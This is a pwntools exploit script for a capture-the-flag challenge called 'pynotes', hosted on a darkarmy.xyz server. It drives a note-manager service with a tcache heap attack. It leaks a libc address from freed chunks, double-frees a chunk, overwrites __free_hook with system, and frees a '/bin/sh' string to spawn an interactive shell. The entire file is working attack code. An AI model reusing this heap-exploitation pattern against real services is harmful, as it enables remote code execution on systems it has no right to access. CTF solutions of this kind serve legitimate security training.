from pwn import *

io=remote('pynotes.darkarmy.xyz',32769)


#io = process("./a.out",env={"LD_PRELOAD":"./libc.so.6"})

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)


#gdb.attach(io)
#io.interactive()


#"""
if __name__ == '__main__':
    sla('\n','new(0,0x80,1234)')
    for i in range(1,9):
        sl('new(' + str(i) +  ',0x80,1234)')
    sl("new(9,10,12345)")
    for i in range(9):
        sl('delete(' + str(i) + ')')
    sl('leak = view(8)')
    sl('leak=leak-4111520')
    sl('binsh = 0x0068732f6e69622f')
    sl('fun = leak + 0x4f4e0')
    sl('hook = leak + 0x3ed8e8')
    sl("new(0,0x60,12345)")
    sl("print(leak)")
    sl("print(hook)")
    sl("delete(0)")
    sl("delete(0)")
    sl("delete(0)")
    sl("new(2,0x60,hook)")
    sl("new(3,0x60,binsh)")
    sl("new(4,0x60,fun)")
    sl("print(view(4))")
    sl("delete(3)")
    sl("DARKCTF")
    io.interactive()
#"""
